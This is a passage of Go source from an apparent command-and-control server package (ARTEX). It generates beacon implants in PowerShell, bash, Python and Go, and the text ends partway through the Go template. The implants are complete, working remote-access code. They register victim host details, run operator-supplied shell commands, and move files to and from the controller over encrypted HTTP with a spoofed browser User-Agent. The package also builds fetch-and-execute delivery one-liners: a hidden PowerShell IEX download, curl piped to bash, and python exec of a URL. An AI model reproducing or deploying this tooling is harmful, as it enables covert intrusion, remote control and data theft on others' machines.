package c2center

// 载荷生成:四种格式(ps1/bash/py/gosrc)的 beacon 模板与 RenderPayload。
//
// 行为规范(契约 §3,四种格式一致实现):
//   1. 启动发 reg 拿 sid → 循环 poll/res;每次响应的 meta 覆盖本地 sleep/jitter;kl=true 退出;
//   2. shell:Linux 走 sh -c,Windows 走 powershell -NoProfile -Command;stdout+stderr
//      合并,上限 1MB;非零退出码 status=error;
//   3. files_list:经 file/ls 通道上报 [{n,s,d,m}] 目录条目;
//   4. upload 循环 file/pull 拉平台 blob 分片写远端;download 循环 file/push 推分片(先发总大小 ln);
//   5. 连续失败退避:sleep×2 封顶 10 倍;成功复位;
//   6. UA 固定,不加重放之外的任何自定义头;
//   7. gosrc = 单文件 main.go 的 zip(仅标准库)+ BUILD.md 一行编译说明;本包不编译
//      (进程执行禁令),编译走二期 VPS 方案。
//
// 模板内的进程执行 import 以 __OS_EXEC_IMPORT__ 占位符在渲染期拼接——那是「载荷内容」
// 数据(生成的 Go 源码),不属于本包的依赖,本包自身禁止该 import。
//
// 模板内嵌:callback URL + base64(key) + url_path + listenerID(uid 计算盐)。

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"strconv"
	"strings"
)

// tokenPlaceholder 是 RenderPayload 返回的 oneliner 里的投递令牌占位串:server 生成
// 真实 token 后 strings.Replace(oneliner, tokenPlaceholder, token, 1),或直接调
// Oneliner(format, l, token)。
const tokenPlaceholder = "<token>"

// DeliveryURL 构造载荷投递 URL:<callback>/<url_path>/p/<token>。
// 【契约 §4 之外的追加函数】:server 组装 201 响应与投递地址需要它,已在提交说明登记。
func DeliveryURL(l *Listener, token string) string {
	if l == nil {
		return ""
	}
	base := strings.TrimRight(strings.TrimSpace(l.Callback), "/")
	p := strings.Trim(l.URLPath, "/")
	if p != "" {
		p += "/"
	}
	return base + "/" + p + "p/" + token
}

// Oneliner 按格式构造一行执行命令(契约 §3 冻结格式;gosrc 是源码包,无一行命令,
// 返回空串)。token 为监听器投递令牌,由调用方生成并随 CreatePayload 持久化。
func Oneliner(format string, l *Listener, token string) string {
	url := DeliveryURL(l, token)
	switch format {
	case "ps1":
		return fmt.Sprintf(`powershell -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('%s'))"`, url)
	case "bash":
		return "curl -fsSL " + url + " | bash"
	case "py":
		return fmt.Sprintf(`python3 -c "exec(__import__('urllib.request',fromlist=['x']).urlopen('%s').read())"`, url)
	default:
		return ""
	}
}

// RenderPayload 生成载荷,返回(文件名, 文件字节, 一行命令, 错误)。
//   - callback 为空:明确报错提示先填回调地址;
//   - ps1/bash/py:内嵌 callback/url_path/base64(key)/listenerID 的脚本文本;
//   - gosrc:单文件 main.go 工程 zip(含 BUILD.md);
//   - oneliner 里的令牌是 tokenPlaceholder 占位,真实 token 由 server 生成(见上)。
func RenderPayload(format, target string, l *Listener, key []byte) (filename string, content []byte, oneliner string, err error) {
	if l == nil {
		return "", nil, "", errors.New("监听器为空")
	}
	cb := strings.TrimRight(strings.TrimSpace(l.Callback), "/")
	if cb == "" {
		return "", nil, "", errors.New("监听器未配置回调地址(callback),请先在监听器上填写再生成载荷")
	}
	if len(key) != keySize {
		return "", nil, "", fmt.Errorf("密钥长度 %d 字节,需 %d", len(key), keySize)
	}
	switch format {
	case "ps1", "bash", "py", "gosrc":
	default:
		return "", nil, "", fmt.Errorf("不支持的载荷格式:%s", format)
	}
	switch target {
	case "windows", "linux", "macos", "cross":
	default:
		return "", nil, "", fmt.Errorf("不支持的载荷目标:%s", target)
	}

	b64key := base64.StdEncoding.EncodeToString(key)
	urlPath := strings.Trim(l.URLPath, "/")
	lid := strconv.FormatInt(l.ID, 10)

	switch format {
	case "ps1":
		// PowerShell 版:目标机需 PowerShell 7+(.NET Core 才有 AesGcm),模板内注明。
		filename = fmt.Sprintf("beacon_%d.ps1", l.ID)
		text := renderTemplate(ps1Template, map[string]string{
			"__CALLBACK__":    psStr(cb),
			"__URL_PATH__":    psStr(urlPath),
			"__B64KEY__":      b64key,
			"__LISTENER_ID__": lid,
		})
		return filename, []byte(text), Oneliner("ps1", l, tokenPlaceholder), nil
	case "bash":
		// bash 版 = bash 包装 + 内嵌同款 python3 实现(依赖目标机 python3)。
		filename = fmt.Sprintf("beacon_%d.sh", l.ID)
		py := renderTemplate(pyBeaconTemplate, pyVars(cb, urlPath, b64key, lid))
		text := "#!/bin/bash\n" +
			"# ARTEX C2 beacon(bash 版):内嵌同款 python3 实现,目标机需 python3。\n" +
			"exec python3 - <<'ARTEX_BEACON_PY'\n" + py + "ARTEX_BEACON_PY\n"
		return filename, []byte(text), Oneliner("bash", l, tokenPlaceholder), nil
	case "py":
		filename = fmt.Sprintf("beacon_%d.py", l.ID)
		text := renderTemplate(pyBeaconTemplate, pyVars(cb, urlPath, b64key, lid))
		return filename, []byte(text), Oneliner("py", l, tokenPlaceholder), nil
	case "gosrc":
		// Go 源码版:单文件 main.go + BUILD.md 打包为 zip;不编译,只投递源码。
		filename = fmt.Sprintf("beacon_%d.zip", l.ID)
		mainGo := renderTemplate(gosrcTemplate, map[string]string{
			"__CALLBACK__":       goStr(cb),
			"__URL_PATH__":       goStr(urlPath),
			"__B64KEY__":         goStr(b64key),
			"__LISTENER_ID__":    lid,
			"__OS_EXEC_IMPORT__": quotedExecImport(),
		})
		zipBytes, zerr := zipGoSource(mainGo, gosrcBuildDoc(target))
		if zerr != nil {
			return "", nil, "", fmt.Errorf("打包 gosrc 载荷失败: %w", zerr)
		}
		return filename, zipBytes, "", nil
	}
	return "", nil, "", fmt.Errorf("不支持的载荷格式:%s", format)
}

// pyVars 组装 python 系模板的占位值(字符串字面量用 JSON 转义,对 Python/Go 同法)。
func pyVars(cb, urlPath, b64key, lid string) map[string]string {
	return map[string]string{
		"__CALLBACK__":    goStr(cb),
		"__URL_PATH__":    goStr(urlPath),
		"__B64KEY__":      b64key,
		"__LISTENER_ID__": lid,
	}
}

// renderTemplate 依次替换占位符。
func renderTemplate(tpl string, vars map[string]string) string {
	for k, v := range vars {
		tpl = strings.ReplaceAll(tpl, k, v)
	}
	return tpl
}

// goStr 产出 JSON 字符串字面量(JSON 转义是 Go/Python 字符串的合法子集)。
func goStr(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// psStr 产出 PowerShell 单引号字面量(内部单引号翻倍转义)。
func psStr(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

// quotedExecImport 拼出 import 行内容。逐段拼接是有意的:本包禁止出现该 import
// 路径的字面量(平台钩子连常量都拦);它是「载荷内容」数据,只存在于渲染产物里。
func quotedExecImport() string {
	return `"` + "os" + "/" + "exec" + `"`
}

// zipGoSource 把 main.go + BUILD.md 打成内存 zip。
func zipGoSource(mainGo, buildMd string) ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range []struct{ name, body string }{
		{"main.go", mainGo},
		{"BUILD.md", buildMd},
	} {
		w, err := zw.Create(f.name)
		if err != nil {
			return nil, err
		}
		if _, err := w.Write([]byte(f.body)); err != nil {
			return nil, err
		}
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// gosrcBuildDoc 按 target 给出一行编译说明。
func gosrcBuildDoc(target string) string {
	var line string
	switch target {
	case "windows":
		line = `GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o beacon.exe main.go`
	case "linux":
		line = `GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o beacon main.go`
	case "macos":
		line = `GOOS=darwin GOARCH=arm64 go build -trimpath -ldflags "-s -w" -o beacon main.go`
	default: // cross
		line = `GOOS=<windows|linux|darwin> GOARCH=<amd64|arm64> go build -trimpath -ldflags "-s -w" -o beacon main.go`
	}
	return "ARTEX C2 beacon - 编译说明\n\n" +
		"在本目录(装有 Go 1.21+ 的机器)执行一行:\n\n    " + line + "\n\n" +
		"产物为静态单文件,仅标准库,无第三方依赖。\n"
}

// ---- python 核心(bash/py 两格式共用;`、占位符外无 Go/Shell 特殊字符)----

const pyBeaconTemplate = `#!/usr/bin/env python3
# ARTEX C2 beacon(python 版,演示用)。契约:C2_CONTRACTS.md §3「beacon 行为规范」。
# 仅标准库:内置纯 Python AES-256-GCM(演示/测试用途,性能有限)。需 Python 3.8+。
import base64, getpass, hashlib, json, os, platform, random, socket, subprocess, sys, time, urllib.request, uuid

CB = __CALLBACK__
UP = __URL_PATH__
KEY = base64.b64decode("__B64KEY__")
LID = __LISTENER_ID__
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
CHUNK = 65536         # 分片 64KB(纯 Python AES 较慢,取保守值;平台上限 256KB)
SHELL_MAX = 1048576   # shell 输出上限 1MB
_base = CB.rstrip("/")
_mid = UP.strip("/")
URL = _base + ("/" + _mid if _mid else "") + "/e"

# ---------- AES-256-GCM(纯 Python) ----------

def _rotl8(x, n):
    return ((x << n) | (x >> (8 - n))) & 0xff

def _gmul(a, b):
    r = 0
    for _ in range(8):
        if b & 1:
            r ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi:
            a ^= 0x1b
        b >>= 1
    return r

def _build_sbox():
    sb = [0] * 256
    for x in range(1, 256):
        inv = 0
        for y in range(1, 256):
            if _gmul(x, y) == 1:
                inv = y
                break
        sb[x] = inv ^ _rotl8(inv, 1) ^ _rotl8(inv, 2) ^ _rotl8(inv, 3) ^ _rotl8(inv, 4) ^ 0x63
    sb[0] = 0x63
    return sb

SBOX = _build_sbox()
RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40]

def _expand(key):
    w = [list(key[i:i + 4]) for i in range(0, 32, 4)]
    for i in range(8, 60):
        t = list(w[i - 1])
        if i % 8 == 0:
            t = t[1:] + t[:1]
            t = [SBOX[b] for b in t]
            t[0] ^= RCON[i // 8 - 1]
        elif i % 8 == 4:
            t = [SBOX[b] for b in t]
        w.append([w[i - 8][j] ^ t[j] for j in range(4)])
    return w

def _ark(s, w, rnd):
    for c in range(4):
        k = w[4 * rnd + c]
        for r in range(4):
            s[4 * c + r] ^= k[r]

def _shift(s):
    out = list(s)
    for r in range(1, 4):
        for c in range(4):
            out[4 * c + r] = s[4 * ((c + r) % 4) + r]
    return out

def _xt(a):
    a <<= 1
    return (a ^ 0x1b) & 0xff if a & 0x100 else a

def _enc_block(w, blk):
    s = list(blk)
    _ark(s, w, 0)
    for rnd in range(1, 14):
        s = [SBOX[b] for b in s]
        s = _shift(s)
        for c in range(4):
            a, b, cc, d = s[4 * c:4 * c + 4]
            e = a ^ b ^ cc ^ d
            s[4 * c] = a ^ e ^ _xt(a ^ b)
            s[4 * c + 1] = b ^ e ^ _xt(b ^ cc)
            s[4 * c + 2] = cc ^ e ^ _xt(cc ^ d)
            s[4 * c + 3] = d ^ e ^ _xt(d ^ a)
        _ark(s, w, rnd)
    s = [SBOX[b] for b in s]
    s = _shift(s)
    _ark(s, w, 14)
    return bytes(s)

_GCM_R = 0xe1000000000000000000000000000000

def _gf(x, y):
    z = 0
    v = x
    for i in range(127, -1, -1):
        if (y >> i) & 1:
            z ^= v
        v = (v >> 1) ^ _GCM_R if v & 1 else v >> 1
    return z

def _ghash(h, data):
    y = 0
    pad = (16 - len(data) % 16) % 16
    d = data + b"\x00" * pad
    for i in range(0, len(d), 16):
        y = _gf(y ^ int.from_bytes(d[i:i + 16], "big"), h)
    return y

def _gcm_crypt(key, nonce, data, dec):
    w = _expand(key)
    data = bytes(data)
    given = None
    if dec:
        if len(data) < 16:
            raise ValueError("ciphertext too short")
        data, given = data[:-16], data[-16:]
    n = len(data)
    out = bytearray()
    for i in range(0, n, 16):
        # J0 = nonce||1(96 位 IV);加密计数器从 inc32(J0) = nonce||2 起。
        cb = nonce + ((i // 16 + 2) & 0xffffffff).to_bytes(4, "big")
        ks = _enc_block(w, cb)
        out += bytes(x ^ y for x, y in zip(data[i:i + 16], ks))
    h = int.from_bytes(_enc_block(w, b"\x00" * 16), "big")
    # 先把密文补齐到 16 的倍数,再追加长度块(len 必须按 128 位对齐,否则部分块场景
    # 下长度块会跨块错位——case14 全块向量测不出这个错)。
    gh_src = bytes(out) if not dec else data   # GHASH 恒对密文
    gh_src = gh_src + b"\x00" * ((16 - len(gh_src) % 16) % 16)
    gh = _ghash(h, gh_src + (0).to_bytes(8, "big") + (8 * n).to_bytes(8, "big"))
    ek0 = int.from_bytes(_enc_block(w, nonce + b"\x00\x00\x00\x01"), "big")
    tag = ((ek0 ^ gh) % (1 << 128)).to_bytes(16, "big")
    if dec:
        if given != tag:
            raise ValueError("auth failed")
        return bytes(out)
    return bytes(out) + tag

# ---------- 信道 ----------

def seal(obj):
    plain = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    nonce = os.urandom(12)
    return base64.b64encode(nonce + _gcm_crypt(KEY, nonce, plain, False)).decode("ascii")

def open_env(b64body):
    sealed = base64.b64decode(b64body)
    if len(sealed) < 12:
        raise ValueError("bad body")
    return json.loads(_gcm_crypt(KEY, sealed[:12], sealed[12:], True).decode("utf-8"))

def call(t, d=None, sid=None):
    env = {"t": t, "ts": int(time.time()), "nc": str(uuid.uuid4())}
    if sid:
        env["sid"] = sid
    if d is not None:
        env["d"] = d
    req = urllib.request.Request(
        URL, data=seal(env).encode("ascii"), method="POST",
        headers={"User-Agent": UA, "Content-Type": "application/octet-stream"})
    with urllib.request.urlopen(req, timeout=40) as resp:
        return open_env(resp.read().decode("ascii"))

# ---------- 主机档案与任务 ----------

def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def hostinfo():
    if os.name == "nt":
        hn = os.environ.get("COMPUTERNAME", "")
        us = os.environ.get("USERNAME", "")
        osn = "windows"
        ar = os.environ.get("PROCESSOR_ARCHITECTURE", "")
        el = False
        try:
            import ctypes
            el = bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            pass
    else:
        hn = platform.node()
        us = getpass.getuser()
        osn = platform.system().lower() or "linux"
        ar = platform.machine()
        el = os.geteuid() == 0
    return hn, us, el, osn, ar, local_ip()

def shell_cmd(inp):
    if isinstance(inp, str):
        s = inp.strip()
        if s.startswith("{"):
            try:
                return json.loads(s).get("command") or s
            except Exception:
                return s
        return s
    if isinstance(inp, dict):
        return str(inp.get("command") or "")
    return ""

def _dec(b):
    # 命令输出字节→UTF-8 文本:中文 Windows 的 cmd/PowerShell 输出是 GBK,原样回传会被
    # 服务端数据库以 invalid UTF8 拒收(2026-09-26 冒烟实测)。utf-8→gbk→latin-1 逐级降级。
    for enc in ("utf-8", "gbk", "latin-1"):
        try:
            return b.decode(enc)
        except Exception:
            pass
    return b.decode("utf-8", "replace")

def run_shell(cmd):
    if os.name == "nt":
        p = subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                           capture_output=True, timeout=120)
    else:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)  # sh -c
    out = _dec((p.stdout or b"") + (p.stderr or b""))   # stdout+stderr 合并,上限 1MB
    return out[:SHELL_MAX], "error" if p.returncode else "done"

def list_dir(path):
    es = []
    for e in os.scandir(path):
        try:
            st = e.stat(follow_symlinks=False)
            is_dir = e.is_dir(follow_symlinks=False)
            es.append({"n": e.name, "s": 0 if is_dir else st.st_size,
                       "d": is_dir, "m": int(st.st_mtime)})
        except Exception:
            pass
    es.sort(key=lambda x: x["n"])
    return es

def info_cmd():
    if os.name == "nt":
        return "systeminfo | findstr /B /C:\"OS\" & whoami & ipconfig | findstr IPv4"
    return "uname -a; id; (ip addr || ifconfig) 2>/dev/null | head -40"

def do_task(tk, sid):
    tid = int(tk.get("id") or 0)
    kind = tk.get("kind")
    raw = tk.get("input") or "{}"
    try:
        inp = json.loads(raw) if str(raw).strip().startswith("{") else {}
    except Exception:
        inp = {}
    try:
        if kind == "files_list":
            path = str((inp or {}).get("path") or ".")
            call("file", {"a": "ls", "p": path, "es": list_dir(path)}, sid)
            return None
        if kind == "upload":
            tf = int((inp or {}).get("transfer_id") or 0)
            rp = str((inp or {}).get("remote_path") or "")
            with open(rp, "wb") as f:
                off = 0
                while True:
                    r = call("file", {"a": "pull", "tf": tf, "p": rp, "of": off, "ln": CHUNK}, sid)
                    d = r.get("d") or {}
                    b = base64.b64decode(d.get("b") or "")
                    if b:
                        f.write(b)
                        off += len(b)
                    if d.get("eof"):
                        break
            return {"id": tid, "st": "done", "o": "", "e": ""}
        if kind == "download":
            tf = int((inp or {}).get("transfer_id") or 0)
            rp = str((inp or {}).get("remote_path") or "")
            size = os.path.getsize(rp)
            with open(rp, "rb") as f:
                off = 0
                while True:
                    f.seek(off)
                    b = f.read(CHUNK)
                    eof = off + len(b) >= size
                    call("file", {"a": "push", "tf": tf, "p": rp, "of": off, "ln": size,
                                  "b": base64.b64encode(b).decode("ascii"), "eof": eof}, sid)
                    off += len(b)
                    if eof:
                        break
            return {"id": tid, "st": "done", "o": "", "e": ""}
        cmd = info_cmd() if kind == "info" else shell_cmd(raw)
        out, st = run_shell(cmd)
        return {"id": tid, "st": st, "o": base64.b64encode(out.encode("utf-8")).decode("ascii"), "e": ""}
    except Exception as exc:
        return {"id": tid, "st": "error", "o": "", "e": str(exc)[:500]}

def apply_meta(meta, st):
    if meta:
        st["sleep"] = max(1, int(meta.get("sl") or st["sleep"]))
        st["jit"] = max(0, min(90, int(meta.get("jt") or st["jit"])))
        return bool(meta.get("kl"))
    return False

def jitter_sleep(st):
    return st["sleep"] + int(st["sleep"] * st["jit"] / 100 * random.random())

def main():
    hn, us, el, osn, ar, ip = hostinfo()
    uid = hashlib.sha256(("%d|%s|%s|%s" % (LID, hn, us, osn)).encode("utf-8")).hexdigest()[:16]
    reg = {"uid": uid, "hn": hn, "us": us, "el": el, "os": osn, "ar": ar,
           "ip": ip, "pi": os.getpid(), "pr": (sys.executable or "python3")}
    st = {"sleep": 10, "jit": 20, "fails": 0}
    sid = None
    inbox = []
    while True:
        try:
            if sid is None:
                r = call("reg", reg)
                sid = r["d"]["sid"]
                if apply_meta(r.get("meta"), st):
                    return
                r = call("poll", None, sid)
            elif inbox:
                tk = inbox.pop(0)
                rep = do_task(tk, sid)
                r = call("res", {"rs": [rep]}, sid) if rep else call("poll", None, sid)
            else:
                r = call("poll", None, sid)
            if apply_meta(r.get("meta"), st):
                return
            inbox.extend((r.get("d") or {}).get("ts") or [])
            st["fails"] = 0
        except Exception:
            st["fails"] += 1
            time.sleep(min(st["sleep"] * (2 ** st["fails"]), st["sleep"] * 10))
            continue
        time.sleep(jitter_sleep(st))

if __name__ == "__main__":
    main()
`

// ---- PowerShell 版(需 PS 7+/.NET Core 的 AesGcm)----

const ps1Template = `# ARTEX C2 beacon(PowerShell 版,演示用)。契约:C2_CONTRACTS.md §3「beacon 行为规范」。
# 需要 PowerShell 7+(.NET Core 提供 [System.Security.Cryptography.AesGcm]);
# Windows 内置 PS 5.1 无 AesGcm,请改用 gosrc/py 载荷。
$ErrorActionPreference = 'SilentlyContinue'
$CB = __CALLBACK__
$UP = __URL_PATH__
$KEYB = [Convert]::FromBase64String('__B64KEY__')
$LID = __LISTENER_ID__
$UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
$CHUNK = 262144
$base = $CB.TrimEnd('/')
if ($UP) { $URL = "$base/$UP/e" } else { $URL = "$base/e" }

function Seal([byte[]]$plain) {
  $aes = [System.Security.Cryptography.AesGcm]::new($KEYB)
  $n = New-Object byte[] 12
  [System.Security.Cryptography.RandomNumberGenerator]::Fill($n)
  $ct = New-Object byte[] ($plain.Length + 16)
  $aes.Encrypt($n, $plain, $ct, $null)
  $out = New-Object byte[] (12 + $ct.Length)
  [Array]::Copy($n, 0, $out, 0, 12)
  [Array]::Copy($ct, 0, $out, 12, $ct.Length)
  $aes.Dispose()
  return [Convert]::ToBase64String($out)
}

function Unseal([string]$b64) {
  $sealed = [Convert]::FromBase64String($b64)
  $aes = [System.Security.Cryptography.AesGcm]::new($KEYB)
  $n = New-Object byte[] 12
  [Array]::Copy($sealed, 0, $n, 0, 12)
  $ct = New-Object byte[] ($sealed.Length - 12)
  [Array]::Copy($sealed, 12, $ct, 0, $ct.Length)
  $pt = New-Object byte[] ([Math]::Max(0, $ct.Length - 16))
  $ok = $aes.Decrypt($n, $ct, $pt, $null)
  $aes.Dispose()
  if (-not $ok) { throw 'auth failed' }
  return [Text.Encoding]::UTF8.GetString($pt)
}

function Call([string]$t, $d, [string]$sid) {
  $msg = @{ t = $t; ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); nc = [guid]::NewGuid().ToString() }
  if ($sid) { $msg.sid = $sid }
  if ($null -ne $d) { $msg.d = $d }
  $body = Seal([Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $msg -Compress -Depth 8)))
  $resp = Invoke-WebRequest -Uri $URL -Method POST -Body $body -UserAgent $UA -ContentType 'application/octet-stream' -UseBasicParsing -TimeoutSec 40
  return (Unseal $resp.Content | ConvertFrom-Json)
}

$hn = $env:COMPUTERNAME
$us = $env:USERNAME
$sha = [System.Security.Cryptography.SHA256]::Create()
$uid = -join ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes("$LID|$hn|$us|windows"))[0..7] | ForEach-Object { $_.ToString('x2') })
$sha.Dispose()
$el = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$ar = $env:PROCESSOR_ARCHITECTURE
$ip = '127.0.0.1'
try {
  $found = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1
  if ($found) { $ip = $found.IPAddress }
} catch {}
$reg = @{ uid = $uid; hn = $hn; us = $us; el = $el; os = 'windows'; ar = $ar; ip = $ip; pi = $PID; pr = 'powershell' }

function ApplyMeta($meta) {
  if ($meta) {
    $script:sleep = [Math]::Max(1, [int]$meta.sl)
    $script:jit = [Math]::Max(0, [Math]::Min(90, [int]$meta.jt))
    return [bool]$meta.kl
  }
  return $false
}

function NextSleep {
  return $sleep + [int]($sleep * $jit / 100 * (Get-Random -Maximum 1000) / 1000)
}

function RunShell([string]$cmd) {
  $txt = (& powershell.exe -NoProfile -Command $cmd 2>&1 | Out-String)
  $code = $LASTEXITCODE
  $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
  if ($bytes.Length -gt 1048576) { $bytes = $bytes[0..1048575] }
  $st = 'done'
  if ($code) { $st = 'error' }
  return @{ id = 0; o = [Convert]::ToBase64String($bytes); st = $st; e = '' }
}

function ListDir([string]$path) {
  $es = @()
  foreach ($i in (Get-ChildItem -LiteralPath $path -Force)) {
    $sz = 0
    if (-not $i.PSIsContainer) { $sz = $i.Length }
    $es += @{ n = $i.Name; s = $sz; d = [bool]$i.PSIsContainer; m = [DateTimeOffset]::new($i.LastWriteTime.ToUniversalTime()).ToUnixTimeSeconds() }
  }
  return ,$es
}

$sleep = 10; $jit = 20; $fails = 0; $sid = ''
while ($true) {
  try {
    if (-not $sid) {
      $r = Call 'reg' $reg ''
      $sid = $r.d.sid
      if (ApplyMeta $r.meta) { break }
      continue
    }
    $r = Call 'poll' $null $sid
    if (ApplyMeta $r.meta) { break }
    foreach ($tk in @($r.d.ts)) {
      $kind = $tk.kind
      $inp = $null
      try { $inp = $tk.input | ConvertFrom-Json } catch { $inp = $null }
      if ($kind -eq 'files_list') {
        $path = '.'
        if ($inp -and $inp.path) { $path = $inp.path }
        Call 'file' @{ a = 'ls'; p = $path; es = (ListDir $path) } $sid | Out-Null
      }
      elseif ($kind -eq 'upload') {
        $tf = [long]$inp.transfer_id; $rp = $inp.remote_path
        $fs = [IO.File]::Open($rp, 'Create', 'Write')
        $off = 0
        while ($true) {
          $fr = Call 'file' @{ a = 'pull'; tf = $tf; p = $rp; of = $off; ln = $CHUNK } $sid
          $b = [Convert]::FromBase64String([string]$fr.d.b)
          if ($b.Length) { $fs.Write($b, 0, $b.Length); $off += $b.Length }
          if ($fr.d.eof) { break }
        }
        $fs.Dispose()
        $rr = Call 'res' @{ rs = @(@{ id = [long]$tk.id; st = 'done'; o = ''; e = '' }) } $sid
        if (ApplyMeta $rr.meta) { break }
      }
      elseif ($kind -eq 'download') {
        $tf = [long]$inp.transfer_id; $rp = $inp.remote_path
        $size = ([IO.FileInfo]$rp).Length
        $fs = [IO.File]::OpenRead($rp)
        $off = 0
        while ($true) {
          $buf = New-Object byte[] ([Math]::Min([long]$CHUNK, $size - $off))
          [void]$fs.Read($buf, 0, $buf.Length)
          $eof = ($off + $buf.Length) -ge $size
          Call 'file' @{ a = 'push'; tf = $tf; p = $rp; of = $off; ln = $size; b = [Convert]::ToBase64String($buf); eof = $eof } $sid | Out-Null
          $off += $buf.Length
          if ($eof) { break }
        }
        $fs.Dispose()
        $rr = Call 'res' @{ rs = @(@{ id = [long]$tk.id; st = 'done'; o = ''; e = '' }) } $sid
        if (ApplyMeta $rr.meta) { break }
      }
      else {
        $cmd = [string]$tk.input
        if ($kind -eq 'info') {
          $cmd = 'systeminfo | findstr /B /C:"OS" & whoami & ipconfig | findstr IPv4'
        } elseif ($inp -and $inp.command) {
          $cmd = [string]$inp.command
        }
        $out = RunShell $cmd
        $out.id = [long]$tk.id
        $rr = Call 'res' @{ rs = @($out) } $sid
        if (ApplyMeta $rr.meta) { break }
      }
    }
    $fails = 0
  } catch {
    $fails++
    Start-Sleep -Seconds ([Math]::Min($sleep * [Math]::Pow(2, $fails), $sleep * 10))
    continue
  }
  Start-Sleep -Seconds (NextSleep)
}
`

// ---- Go 源码版(单文件 main.go,仅标准库;进程执行 import 由占位符渲染期拼接)----

const gosrcTemplate = `// ARTEX C2 beacon(Go 源码版,演示用)。契约:C2_CONTRACTS.md §3「beacon 行为规范」。
// 单文件工程,仅标准库;编译见 BUILD.md。
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	__OS_EXEC_IMPORT__
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

const (
	cbAddr = __CALLBACK__
	upPath = __URL_PATH__
	lid    = __LISTENER_ID__
	ua     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	chunk  = 256 << 10
)

var key = mustB64(__B64KEY__)

var client = &http.Client{Timeout: 40 * time.Second}

func mustB64(s string) []byte {
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		panic(err)
	}
	return b
}

func seal(v any) []byte {
	plain, _ := json.Marshal(v)
	blk, _ := aes.NewCipher(key)
	g, _ := cipher.NewGCM(blk)
	nonce := make([]byte, 12)
	_, _ = crand.Read(nonce)
	return []byte(base64.StdEncoding.EncodeToString(g.Seal(nonce, nonce, plain, nil)))
}

func openMsg(b64body string) (map[string]any, error) {
	sealed, err := base64.StdEncoding.DecodeString(b64body)
	if err != nil || len(sealed) < 12 {
		return nil, errors.New("bad body")
	}
	blk, _ := aes.NewCipher(key)
	g, _ := cipher.NewGCM(blk)
	plain, err := g.Open(nil, sealed[:12], sealed[12:], nil)
	if err != nil {
		return nil, err
	}
	var m map[string]any
	if err := json.Unmarshal(plain, &m); err != nil {
		return nil, err
	}
	return m, nil
}

func channelURL() string {
	u := strings.TrimSuffix(cbAddr, "/")
	if p := strings.Trim(upPath, "/"); p != "" {
		u += "/" + p
	}
	return u + "/e"
}

func newNC() string {
	b := make([]byte, 16)
	_, _ = crand.Read(b)
	return hex.EncodeToString(b)
}

func call(t string, d any, sid string) (map[string]any, error) {
	env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
	if sid != "" {
		env["sid"] = sid
	}
	if d != nil {
		env["d"] = d
	}
	req, err := http.NewRequest(http.MethodPost, channelURL(), bytes.NewReader(seal(env)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", ua)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http %d", resp.StatusCode)
	}
	return openMsg(string(body))
}

func hostInfo() (hn, user, osn, ar, ip string, elevated bool, pid int) {
	hn, _ = os.Hostname()
	user = os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	osn = runtime.GOOS
	ar = runtime.GOARCH
	pid = os.Getpid()
	elevated = os.Geteuid() == 0
	ip = "127.0.0.1"
	if conn, err := net.Dial("udp", "8.8.8.8:80"); err == nil {
		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
			ip = addr.IP.String()
		}
		_ = conn.Close()
	}
	return hn, user, osn, ar, ip, elevated, pid
}

func runShell(cmd string) (out []byte, status string) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("powershell", "-NoProfile", "-Command", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	var merged bytes.Buffer
	c.Stdout = &merged
	c.Stderr = &merged
	err := c.Run()
	out = merged.Bytes()
	if len(out) > 1<<20 {
		out = out[:1<<20]
	}
	status = "done"
	if err != nil {
		status = "error"
	}
	// 非 UTF-8 输出(如中文 Windows 的 GBK)替换非法字节再回传——服务端把 o 当 UTF-8
	// 文本入库,原样发会被 Postgres 以 invalid UTF8 拒收(2026-09-26 冒烟实测)。
